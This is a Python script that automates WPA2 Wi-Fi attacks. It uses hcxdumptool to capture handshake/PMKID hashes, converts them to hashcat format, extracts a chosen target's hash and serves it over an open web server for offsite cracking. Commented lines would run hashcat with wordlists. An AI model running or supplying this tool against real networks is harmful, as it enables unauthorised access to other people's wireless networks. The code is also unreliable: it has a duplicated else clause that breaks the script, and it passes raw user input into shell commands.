#!/usr/bin/python3


import os , sys
import termcolor
import time
from termcolor import colored , cprint 


def ReconToCrack():
    os.system("service NetworkManager stop ")
    os.system("service wpa_supplicant stop")
    os.system("clear")
    print("")
    os.system("pyfiglet   -j center -w 80  [+]Wpa2ToHashcat[+] --color=YELLOW ")
    print("")
    cprint("[+]Card Exists in Your Machine:","yellow",attrs=["bold"])
    print("")
    os.system("ifconfig | grep wlan* ")
    print("")
    interface=input(termcolor.colored("[+]Monitor Mode : ","white",attrs=["bold"]))
    os.system("airmon-ng start " + "\t" + interface )
    print("")
    os.system("iwconfig")
    print("")
    Hcx=input(termcolor.colored("[+]Enter Monitor Interface >> " ,"white",attrs=["bold"]))
    Path=(" > /root/ReconToCrack/output/BSSID.txt")
    cprint("[+]After 1 Min type Ctrl-C ","yellow",attrs=["bold"])
    
    os.system("hcxdumptool --do_rcascan -i "+  "\t" + Hcx + "\t" +  Path)
    
    time.sleep(3)
    #os.system("gnome-terminal -- tail -f /root/ReconToCrack/output/BSSID.txt &")
    time.sleep(5)
    os.system("pkill hcxdumptool")
    print("")
    cprint("Start Capturing Hash Hcxdumptool Don't Close Tool","yellow",attrs=["bold"])
    print("")
    cprint("[+]After 6 Min type Ctrl-C ","yellow",attrs=["bold"])
    os.system("hcxdumptool -i wlan1mon -o /root/ReconToCrack/output/HashCaptured.pcapng  --active_beacon --enable_status=15")
    time.sleep(2)
    print("")
    print("")
    cprint("[-]Stop Captureing Hash And Started To Converted File To Hashcat forma ...","yellow",attrs=["bold"])
    os.system("hcxpcapngtool -o /root/ReconToCrack/output/Convert.hc22000 -E /root/ReconToCrack/output/Essid.txt  /root/ReconToCrack/output/HashCaptured.pcapng")
    print("")
    print("")
    cprint("[+]Done Your File Converted ...","yellow",attrs=["bold"])
    os.system("rm /root/ReconToCrack/output/HashCaptured.pcapng") 
    print("")
    print("")
    cprint("[+]Check BSSID OF TARGET ","yellow",attrs=["bold"])
    print("")
    os.system("cat /root/ReconToCrack/output/BSSID.txt")
    print("")
    print("")
    Extract=input(termcolor.colored("[+]Target Bssid : " , "red",attrs=["bold"]))
    print("")
    cprint("[+]Extract Hash From Converted File","yellow",attrs=["bold"])
    print("")
    Hacks=("> /root/ReconToCrack/Result/TargetHash.hc22000")
    os.system("cat  /root/ReconToCrack/output/Convert.hc22000 | grep" + "\t" + Extract + "\t" + Hacks)
    if os.path.exists("/root/ReconToCrack/Result/TargetHash.hc22000"):
       cprint("")
       cprint("[+]Done TARGET FILE TargetHash.hc22000  ","yellow",attrs=["bold"])     
       cprint("[+]Start Cracking ","yellow",attrs=["bold"]) 
       print("")
       cprint("[+]Upload http://172.16.42.1:8080/TargetHash.hc22000 To You Server For Cracking ","yellow",attrs=["bold"])
       print("")
       print("")
       os.system("cd /root/ReconToCrack/Result/ && php-cli -S 0.0.0.0:8080 ")
    else:
          cprint("[+]The Target You Have Selected No Exists In file Convert.hc22000 use script Master and choose another target .","yellow",attrs=["bold"])
       #cprint("[WordLists Path]:","blue",attrs=["bold"])
       #print("")
       #os.system("cd /root/ReconToCrack/Kaonashi/wordlists && pwd && ls -alt ")
       #print("")
       #world=input(termcolor.colored("[+]wordlists : " , "red",attrs=["bold"]))
       #print("")
       #os.system("hashcat -m 22000 /root/ReconToCrack/Result/TargetHash.hc22000 " + "\t" + world) 
       #print("")
       #os.system("cat /root/.local/share/hashcat/hashcat.potfile")
    else:
          ReconToCrack()   
ReconToCrack()
